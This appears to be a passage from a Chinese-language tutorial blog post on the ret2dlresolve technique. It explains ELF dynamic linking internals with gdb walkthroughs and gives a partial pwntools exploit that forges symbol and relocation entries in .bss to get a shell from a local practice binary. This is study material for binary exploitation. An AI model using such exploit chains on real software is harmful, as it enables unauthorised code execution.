class="line">└───────┬───────┘</span><br><span class="line">        │</span><br><span class="line">┌───────▼───────┐</span><br><span class="line">│ system(&quot;/bin/sh&quot;) │ ← 成功执行</span><br><span class="line">└───────────────┘</span><br><span class="line"></span><br><span class="line">第一次 ROP 链把伪造的结构写到 .bss，然后第二次 ROP 链调用 plt[0]，让动态链接器解析我们伪造的 &quot;system&quot;，最终执行 system(&quot;/bin/sh&quot;)。</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="ii-前置"><a href="#ii-前置" class="headerlink" title="ii 前置"></a>ii 前置</h3><h4 id="1-符号表-Symbol-Table"><a href="#1-符号表-Symbol-Table" class="headerlink" title="1. 符号表 (Symbol Table)"></a>1. 符号表 (Symbol Table)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> st_name;       <span class="comment">// 符号名在字符串表中的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info;  <span class="comment">// 符号类型和绑定信息</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">// 符号可见性</span></span><br><span class="line">    <span class="type">uint16_t</span> st_shndx;      <span class="comment">// 符号所在的段索引</span></span><br><span class="line">    Elf64_Addr st_value;    <span class="comment">// 符号的值（地址或偏移）</span></span><br><span class="line">    Elf64_Xword st_size;    <span class="comment">// 符号大小（字节数）</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<ul>
<li>ELF 文件里有一个符号表，记录了程序里用到的函数和变量的名字，以及它们在文件中的位置。</li>
<li><strong>作用</strong>：当程序调用一个外部函数（比如 <code>printf</code>、<code>read</code>），动态链接器需要知道“这个名字对应哪个库里的哪个地址”。符号表就是用来存储这些名字和索引的。</li>
<li><strong>举例</strong>：符号表里可能有一条记录：<code>name=&quot;read&quot;, type=FUNC, index=123</code>。链接器通过它找到 libc 里的 <code>read</code>。</li>
</ul>
<h4 id="2-重定位表-Relocation-Table"><a href="#2-重定位表-Relocation-Table" class="headerlink" title="2. 重定位表 (Relocation Table)"></a>2. 重定位表 (Relocation Table)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset;   <span class="comment">// 需要修复的地址（比如 GOT 槽）</span></span><br><span class="line">    Elf64_Xword r_info;    <span class="comment">// 符号索引 + 类型</span></span><br><span class="line">    Elf64_Sxword r_addend; <span class="comment">// 附加值</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<ul>
<li>重定位表记录了“哪些地方需要填充真实地址”。</li>
<li><strong>作用</strong>：程序里调用外部函数时，指令里并没有直接写死地址，而是写了一个占位符。运行时，动态链接器根据重定位表，把 GOT 表项填上真实地址。</li>
<li><strong>举例</strong>：重定位表里可能有一条记录：<code>offset=read@got, symbol=read</code>。意思是：把 GOT 表里 <code>read</code> 的位置填上 libc 中 <code>read</code> 的真实地址。</li>
</ul>
<h4 id="3-在-bss-段布置伪造的表"><a href="#3-在-bss-段布置伪造的表" class="headerlink" title="3. 在 .bss 段布置伪造的表"></a>3. 在 <code>.bss</code> 段布置伪造的表</h4><ul>
<li>原程序的符号表和重定位表在 ELF 文件里是固定的，正常情况下只能解析已有的函数。</li>
<li>但是动态链接器的逻辑是：只要你给它一个“符号索引”，它就会去符号表里查找名字，然后解析。</li>
<li><strong>漏洞利用点</strong>：我们可以在 <code>.bss</code> 段伪造一份假的符号表和重定位表，把名字写成<code>&quot;system&quot;</code>，这样链接器就会帮我们解析出 libc 里的 <code>system</code>。</li>
<li><code>.bss</code> 段是可读写的内存区域，程序不会初始化它，所以我们可以用第一次 <code>read</code> 把伪造的数据写进去。</li>
</ul>
<h4 id="4-调用-plt-0"><a href="#4-调用-plt-0" class="headerlink" title="4. 调用 plt[0]"></a>4. 调用 <code>plt[0]</code></h4><ul>
<li>在 ELF 文件里，每个外部函数都有一个 <code>plt</code> 桩，比如 <code>read@plt</code>。</li>
<li>但还有一个特殊的入口：<code>plt[0]</code>。</li>
<li><strong>作用</strong>：<code>plt[0]</code> 并不是某个具体函数，而是一个通用的入口，它会调用 <code>_dl_runtime_resolve</code>，根据你提供的 relocation 索引去解析符号。</li>
<li><strong>利用点</strong>：我们在 ROP 链里跳到 <code>plt[0]</code>，并在栈上放一个 relocation 索引。这样链接器会去解析我们伪造的重定位条目，最终跳到 <code>system</code>。</li>
<li>所以，调用 <code>plt[0]</code> 并不是直接调用某个函数，而是触发“动态解析机制”。</li>
</ul>
<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>我们在 gdb 里进入一个 libc 函数，</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/dl.png" alt="image-20260105171814219"></p>
<p>可以看到，程序调用 libc 函数首先进入一个名叫 <code>puts@plt</code> 的函数 (0x401080) ，这是一个<strong>桩函数（stub）</strong>，真正的 <code>puts</code> 地址还没解析时，它会跳到后面的解析逻辑。</p>
<p>然后，从 0x401030 <strong>( plt[0] )</strong> 跳到 0x401020 <strong>(PLT0 的核心入口)</strong>，这里是 PLT 的通用入口，负责调用 <code>_dl_runtime_resolve_xsavec</code> ，它会把一个 <strong>重定位索引 (relocation index)</strong>。压栈，告诉动态链接器要解析哪个符号。</p>
<p>之后，进入 <code>_dl_runtime_resolve_xsavec</code> <strong>(glibc 内部)</strong>，</p>
<p><a href="%E5%85%B7%E4%BD%93%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%AF%B9%E9%BD%90%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99r_info%EF%BC%8C%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99system%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80(st_name)">^</a>: <em>dynamic loader runtime resolver (with xsavec variant) “动态加载器运行时解析函数（xsavec 版本）”</em></p>
<p>这是动态链接器的解析函数。它会根据 relocation 索引去 <code>.rela.plt</code> 找对应的 <code>Elf64_Rela</code> 条目。然后根据 <code>r_info</code> 找到符号表条目 (<code>Elf64_Sym</code>)。再根据 <code>st_name</code> 去字符串表 (<code>.dynstr</code>) 找函数名。最终解析出 libc 里的真实地址，并写入 GOT 表。</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/push0.png" alt="image-20260105175210361"></p>
<p>注意这里的 <code>push 0</code>，这里正是压入的 <strong>重定位索引 (relocation index)</strong>，<em>给动态链接器传递参数，表示“这是第 0 个符号”</em>。即在这个 ELF 的 <strong>重定位表</strong> <code>.rela.plt</code> 里，<code>puts</code> 的条目排在第 0 个。当然，如果 <code>printf</code> 在索引 1 处，就会 <code>push 1</code></p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/fixup.png" alt="image-20260105194426293"></p>
<p>继续查看可以发现，<code>_dl_runtime_resolve_xsavec</code> 总体上的作用是通过 mov 保存和恢复寄存器状态，保证解析过程不会破坏寄存器。而其中 <code>_dl_fixup</code> 是真正的解析函数，它接收 relocation index，找到对应的 <code>.rela.plt</code> 条目。上图可以看到传参过程。</p>
<p>我们步入查看，还可以看到这些函数：<code>_dl_lookup_symbol_x</code>、<code>do_lookup_x</code>、<code>check_match</code>、<code>strcmp</code>。这里简单说明一下：</p>
<blockquote>
<ol>
<li><code>_dl_lookup_symbol_x</code>：这是一个“查找符号”的通用接口，它会在 <strong>link_map</strong>（即已加载的共享库列表）里查找目标符号，内部会调用 <code>do_lookup_x</code> 来做具体的查找工作。</li>
<li><code>do_lookup_x</code>：真正的查找过程在这里完成，它会遍历所有已加载的共享库（比如 libc.so、ld-linux.so），在它们的符号表里查找目标名字，查找时会调用 <code>check_match</code> 来判断某个符号是否匹配。</li>
<li><code>check_match</code>：用来检查候选符号是否和我们要找的符号一致。会比较符号名、版本信息、可见性等。在比较名字时最终会调用 <code>strcmp</code>。</li>
<li><code>strcmp</code>：最底层的字符串比较函数，<strong>内部调用，不用通过plt&#x2F;got解析</strong>，用来判断符号表里的名字（比如 <code>&quot;puts&quot;</code>, <code>&quot;system&quot;</code>) 是否和我们要解析的名字一致。如果匹配成功，就返回这个符号的地址。</li>
</ol>
</blockquote>
<p>最核心的部分还是在<code>_dl_fixup</code>这里，我们直接在调用现场看一下：</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/%E8%B0%83%E7%94%A8%E7%8E%B0%E5%9C%BA.png" alt="image-20260107220959747"></p>
<p><a href="%E5%85%B7%E4%BD%93%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%AF%B9%E9%BD%90%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99r_info%EF%BC%8C%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99system%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80(st_name)">^</a>: _dl_fixup 简化原型 <code>void *_dl_fixup(struct link_map *l, ElfW(Word) reloc_index); </code></p>
<p><a href="%E5%85%B7%E4%BD%93%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%AF%B9%E9%BD%90%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99r_info%EF%BC%8C%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99system%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80(st_name)">^</a>: rdi：存放结构体指针，指向动态链接器内部的<code>struct link_map</code> 结构。<br><a href="%E5%85%B7%E4%BD%93%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%AF%B9%E9%BD%90%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99r_info%EF%BC%8C%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99system%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80(st_name)">^</a>: rsi：relocation index</p>
<blockquote>
<p>link_map(主程序) &lt;-&gt; link_map(libc.so) &lt;-&gt; link_map(ld-linux.so)<br>    │<br>    └─ l_ld → ElfXX_Dyn[]<br>               ├─ DT_SYMTAB → ElfXX_Sym[]<br>               ├─ DT_STRTAB → 字符串表<br>               └─ DT_JMPREL → ElfXX_Rela[]</p>
<p><strong>外层是 链表，每个节点内部再“分叉”到不同的表</strong></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;        <span class="comment">// 模块(库)加载基址</span></span><br><span class="line">    <span class="type">char</span>      *l_name;        <span class="comment">// 模块(库)名字字符串</span></span><br><span class="line">    Elf64_Dyn *l_ld;          <span class="comment">// 指向 .dynamic 段</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span>  <span class="comment">// 链表下一个模块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span>  <span class="comment">// 链表上一个模块</span></span><br><span class="line">    Elf64_Dyn *l_info[DT_NUM];<span class="comment">// 保存 .dynamic 段里各个条目的指针</span></span><br><span class="line"> ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以，rsi &#x3D; 0 这是重定位索引；而 rdi &#x3D; 0x7ffff7ffe2e0，这就是一个 <code>link_map</code> 结构体的地址。它描述了当前 ELF 模块（这里的可执行文件）的加载信息：基址、名字、动态段、符号表、字符串表、重定位表等。</p>
<p>我们直接查看 0x7ffff7ffe2e0 处 <code>link_map</code> 结构体，更深理解一下</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/linkmap.png" alt="屏幕截图 2026-01-24 195943"></p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/linkmap2.png" alt="image-20260124201816243"></p>
<p>解释：      </p>
<ul>
<li>l_addr &#x3D; 0 (主程序l_addr&#x3D;0(不需要加偏移),各个共享库等l_addr ≠ 0)        </li>
<li>l_name → 程序名字字符串(主程序一般为空)</li>
<li>l_ld → .dynamic 段 </li>
<li>l_next → 下一个 link_map</li>
<li>l_prev &#x3D; NULL        </li>
<li>l_real → 自指针&#x2F;内部字段</li>
<li>l_info &#x3D; […]</li>
</ul>
<p>再来看<code>l_info</code>数组，来自 <code>/usr/include/elf.h</code> 中的定义，<strong>重点在索引5、6、7，分别是字符串表地址、符号表地址、重定位表地址</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Sxword d_tag;            <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword d_val;         <span class="comment">/* Integer value */</span></span><br><span class="line">        Elf64_Addr d_ptr;          <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic array tags.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL         0          <span class="comment">/* Marks end of dynamic array */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED       1          <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ     2          <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT       3          <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH         4          <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB       5          <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB       6          <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA         7          <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ       8          <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT      9          <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ       10          <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT      11          <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12          <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13          <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME      14          <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="comment">// ... 还有很多其他定义</span></span><br></pre></td></tr></table></figure>



<p>下面是打印对应结构体内容。<code>d_ptr</code>就是对应地址，根据上面分析的索引5、6、7对应关系，我们查看相应地址处结构就是我们的伪造结构，具体见下面漏洞利用部分</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="image-20260124232357327"></p>
<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><p>我们的编译选项关闭了 PIE，直接去找地址。我们需要用 <code>read</code> 处函数地址来重定向到bss段、<code>.rela.plt段</code>地址来计算重定位条目偏移、 <code>.dynsym段</code> 地址来计算符号索引、<code>.dynstr段</code> 地址来计算字符串偏移。</p>
<blockquote>
<p>指令：readelf -S .&#x2F;ret2dlsolve | grep -E “(plt|got|dyn|bss|rela)”</p>
</blockquote>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/%E5%9C%B0%E5%9D%80.png" alt="image-20260117213619744"></p>
<p>我们第一步的重定向输入到 <code>bss段 </code>，就是通过覆盖 rbp 和返回地址重新读入，具体如exp，不在赘述</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt="image-20260117214206818"></p>
<p>在第二次读入时，我们已经在<code>bss段</code>，接下来的输入需要我们伪造<code>Elf64_Sym(符号表项)</code>、<code>Elf64_Rela(重定位表项)</code>以及 system 和 &#x2F;bin&#x2F;sh 字符串</p>
<p>这里我直接给出伪造的表项，以便理解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Elf64_Sym 符号表 (24字节)</span></span><br><span class="line"><span class="comment"># 结构: [st_name(4)] [st_info(1)+st_other(1)+st_shndx(2)] [st_value(8)] [st_size(8)]</span></span><br><span class="line">st_name  = str_offset       <span class="comment"># 4字节</span></span><br><span class="line">st_info  = <span class="number">0x12</span>             <span class="comment"># STB_GLOBAL|STT_FUNC</span></span><br><span class="line">st_other = <span class="number">0x00</span></span><br><span class="line">st_shndx = <span class="number">0x0000</span></span><br><span class="line">st_value = <span class="number">0x0</span></span><br><span class="line">st_size  = <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Elf64_Rela 重定位表 (24字节)</span></span><br><span class="line">r_info    = (sym_index &lt;&lt; <span class="number">32</span>) | reloc_type <span class="comment"># 构造 r_info</span></span><br><span class="line">r_offset  =  target_got_addr <span class="comment"># R_X86_64_JUMP_SLOT(跳转槽类型)  read@GLIBC_2.2.5</span></span><br><span class="line">r_addend  =  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>我们重点来看3个表项，</p>
<ul>
<li><p>**<code>st_name</code> **：字符串表偏移，动态链接器会根据这个偏移找字符串，并让<code>_dl_lookup_symbol_x</code>函数去libc里查找解析。</p>
</li>
<li><p><strong><code>r_info</code></strong>：一个 64 位的复合字段，包含两部分信息：高 32 位是符号表索引（指向 <code>.dynsym</code> 的某个条目），低 32 位是重定位类型，一般用 <code>R_X86_64_JUMP_SLOT</code> (值是 7)，表示这是一个函数调用需要解析。</p>
</li>
<li><p><strong><code>r_offset</code></strong>：选择一个可写的GOT项写入（objdump -R .&#x2F;dlsolve64）。</p>
</li>
</ul>
<p>**数据结构伪造完成后，我们必须要知道具体的结构体起始地址。并且，因为每个结构体都是24字节，它的起始地址对于相应的动态段地址必须24字节对齐。**这里计算比较麻烦，我们先给出部分exp，之后解释原理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_base       =  bss_addr  + <span class="number">0x800</span>  <span class="comment"># 留出一些空间</span></span><br><span class="line">fake_sym_addr   =  fake_base          <span class="comment"># Elf64_Sym 结构</span></span><br><span class="line">fake_reloc_addr =  fake_base + <span class="number">0x20</span>   <span class="comment"># Elf64_Rela 结构</span></span><br><span class="line">fake_str_addr   =  fake_base + <span class="number">0x38</span>   <span class="comment"># &quot;system\x00&quot; 字符串</span></span><br><span class="line">fake_binsh_addr =  fake_base + <span class="number">0x40</span>   <span class="comment"># &quot;/bin/sh\x00&quot; 字符串</span></span><br><span class="line"></span><br><span class="line">str_offset    =  fake_str_addr - dynstr_addr <span class="comment"># 计算字符串偏移</span></span><br><span class="line">sym_index     = (fake_sym_addr - dynsym_addr)   // <span class="number">24</span> <span class="comment"># 计算符号索引</span></span><br><span class="line">reloc_offset  = (fake_reloc_addr - rel_plt_addr)// <span class="number">24</span> <span class="comment"># 计算伪造的重定位条目偏移</span></span><br></pre></td></tr></table></figure>

<p>我们的第二次输入整体上看是这样布局的：fake_sym(24字节) + fake_reloc(24字节) + system_str(8字节) + binsh_str(8字节) + padding + fake_rbp + …</p>
<p>由于起始地址对于相应的动态段地址必须24字节对齐，并且我们有两个24字节对齐(<code>str_offset</code>和<code>sym_index</code>)，实际调试过程中我们需要通过填充数据手动对齐。上面贴出的代码里可以看到 +0x20之类的，其实是在通过调整payload填充(<code>.ljust(0x20, b&#39;\x00&#39;)</code>)来手动对齐24，具体见exp。</p>
<p><a href="%E5%85%B7%E4%BD%93%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%AF%B9%E9%BD%90%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99r_info%EF%BC%8C%E8%A6%81%E4%B9%88%E6%89%BE%E9%94%99system%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80(st_name)">^</a>: 这里的bss段地址也要微调一下，我个人是先微调bss段地址，让(fake_sym_addr - dynsym_addr)可以以整除24，然后在 Elf64_Sym 后添加 padding 让(fake_reloc_addr - rel_plt_addr)可以以整除24。</p>
<p>最后，我们来看一下payload构造。首先是fake_sym和fake_reloc两个伪造结构，可以看到我填充一些 0，就是为了之前说过的 24 字节对齐，之后输入字符串 execve 和 &#x2F;bin&#x2F;sh，然后填充128字节缓冲区，覆盖返回地址修改参数（这里rdx已经是0就没有再设置）。最后跳转到PLT[0]解析就可以执行 execve</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = fake_sym.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 在符号表条目后面加了一点 padding</span></span><br><span class="line">payload += fake_reloc.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += system_str</span><br><span class="line">payload += binsh_str</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">128</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr+<span class="number">0x100</span>)  <span class="comment"># fake rbp</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(fake_binsh_addr) <span class="comment"># system的参数: &quot;/bin/sh&quot;</span></span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(plt_0_addr)      <span class="comment"># 跳转到PLT[0]</span></span><br><span class="line">payload += p64(reloc_offset)    <span class="comment"># 重定位条目索引</span></span><br></pre></td></tr></table></figure>







<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line">io = process(<span class="string">&#x27;./ret2dlsolve3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============== 地址 ===============</span></span><br><span class="line">main = <span class="number">0x0000000000401222</span></span><br><span class="line">re_read      = <span class="number">0x4011f0</span>    <span class="comment"># 重定向</span></span><br><span class="line">loop         = <span class="number">0x4011bf</span></span><br><span class="line">rel_plt_addr = <span class="number">0x4005a8</span>    <span class="comment"># .rela.plt</span></span><br><span class="line">dynsym_addr  = <span class="number">0x4003d8</span>    <span class="comment"># .dynsym  </span></span><br><span class="line">dynstr_addr  = <span class="number">0x4004b0</span>    <span class="comment"># .dynstr</span></span><br><span class="line">plt_0_addr   = <span class="number">0x401020</span>    <span class="comment"># PLT[0]</span></span><br><span class="line">bss_addr     = <span class="number">0x404030</span>    <span class="comment"># .bss</span></span><br><span class="line">pop_rdi_ret  = <span class="number">0x4011ba</span></span><br><span class="line">pop_rsi_ret  = <span class="number">0x4011bc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============== 重定向 ===============</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter your message: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">128</span> + p64(bss_addr+<span class="number">0x80</span>+<span class="number">0x800</span>) + p64(re_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============== 伪造bss段条目 ===============</span></span><br><span class="line">fake_base       =  bss_addr  + <span class="number">0x800</span>  <span class="comment"># 留出一些空间</span></span><br><span class="line">fake_sym_addr   =  fake_base          <span class="comment"># Elf64_Sym 结构</span></span><br><span class="line">fake_reloc_addr =  fake_base + <span class="number">0x20</span>   <span class="comment"># Elf64_Rela 结构</span></span><br><span class="line">fake_str_addr   =  fake_base + <span class="number">0x38</span>   <span class="comment"># &quot;system\x00&quot; 字符串</span></span><br><span class="line">fake_binsh_addr =  fake_base + <span class="number">0x40</span>   <span class="comment"># &quot;/bin/sh\x00&quot; 字符串</span></span><br><span class="line"></span><br><span class="line">system_str = <span class="string">b&quot;execve\x00\x00&quot;</span> 